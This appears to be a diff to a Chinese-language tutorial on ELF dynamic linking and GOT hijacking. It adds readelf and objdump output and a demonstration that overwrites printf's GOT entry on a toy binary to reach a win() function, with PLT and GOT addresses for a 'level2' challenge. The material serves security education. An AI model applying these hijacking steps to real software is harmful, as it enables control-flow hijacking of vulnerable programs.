@@ -6,7 +6,20 @@
 
 ### GOT表劫持
 
-![GOT HIJACKING](images/ELF文件与动态链接/got_hijack.png)
+```
+$ readelf -S ropasaurusrex 
+There are 28 section headers, starting at offset 0x724:
+
+Section Headers:
+ [Nr] Name       Type      Addr   Off  Size  ES Flg Lk Inf Al
+ ...
+ [23] .got.plt     PROGBITS    08049604 000604 00001c 04 WA 0  0 4         # 这里flag带W，说明可写
+ ...
+Key to Flags:
+ W (write), A (alloc), X (execute), M (merge), S (strings),
+ I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown),
+ O (extra OS processing required), o (OS specific), p (processor specific)
+```
 
    - 延迟绑定机制要求GOT表必须可写
    - 内存漏洞可导致GOT表项被改写，从而劫持PC
@@ -39,6 +52,18 @@ void main() {
 
 程序允许修改任意四字节，如何执行win函数呢？main函数在修改内存后调用了printf函数，因此可以考虑修改printf的GOT表项，将其劫持到win()函数。
 
+```
+$ objdump -R got_hijacking | grep printf        # 查询printf@GOT表地址
+0804a00c R_386_JUMP_SLOT    printf@GLIBC_2.0
+$ objdump -d got_hijacking | grep win           # objdump -d反汇编，查询win()函数地址
+0804848b <win>:
+$ ./got_hijacking
+0804a00c=0804848b                               # 劫持printf@GOT表项为win()函数地址
+You Win!
+```
+
+
+
 
 ### 如何防御GOT表劫持
 
@@ -67,15 +92,44 @@ void main() {
 
 ### 定位plt_write和got_write地址
 
-其中plt_write和got_write都可以通过objdump读取，如下：
+plt_write和got_write都可以通过objdump读取，如下：
 
 ```
  $ objdump -d -j .plt level2
- ....
+
+ Disassembly of section .plt:
+
+ 08048310 <read@plt>:
+  8048310: ff 25 00 a0 04 08 jmp *0x804a000
+  8048316: 68 00 00 00 00 push $0x0
+  804831b: e9 e0 ff ff ff jmp 8048300 <_init+0x30>
+
+ 08048320 <__gmon_start__@plt>:
+  8048320: ff 25 04 a0 04 08 jmp *0x804a004
+  8048326: 68 08 00 00 00 push $0x8
+  804832b: e9 d0 ff ff ff jmp 8048300 <_init+0x30>
+
+ 08048330 <__libc_start_main@plt>:
+  8048330: ff 25 08 a0 04 08 jmp *0x804a008
+  8048336: 68 10 00 00 00 push $0x10
+  804833b: e9 c0 ff ff ff jmp 8048300 <_init+0x30>
+
  08048340 <write@plt>:
   8048340: ff 25 0c a0 04 08 jmp *0x804a00c
   8048346: 68 18 00 00 00 push $0x18
   804834b: e9 b0 ff ff ff jmp 8048300 <_init+0x30>
+```
+
+```
+ $ objdump -R level2
+ //got表
+ DYNAMIC RELOCATION RECORDS
+ OFFSET TYPE VALUE
+ 08049ff0 R_386_GLOB_DAT __gmon_start__
+ 0804a000 R_386_JUMP_SLOT read
+ 0804a004 R_386_JUMP_SLOT __gmon_start__
+ 0804a008 R_386_JUMP_SLOT __libc_start_main
+ 0804a00c R_386_JUMP_SLOT write
 ```
 
 可以看到plt_write值为0x08048340，got_write值为0x804a00c，当然相关实现也已封装到pwntool中，一个调用即可自动获取：
@@ -117,8 +171,6 @@ static void *find_symbol(char *sym) {
 	return r;
 
 }
-
-
 
 static void find_got(char *file) {
 	int fd, i;
@@ -197,7 +249,6 @@ static void find_got(char *file) {
 	
 	sprintf(buf, "[+] Found GOT: 0x%08x\n", vold.got_start);
 	LOG(buf);
-
 }
 ```
 
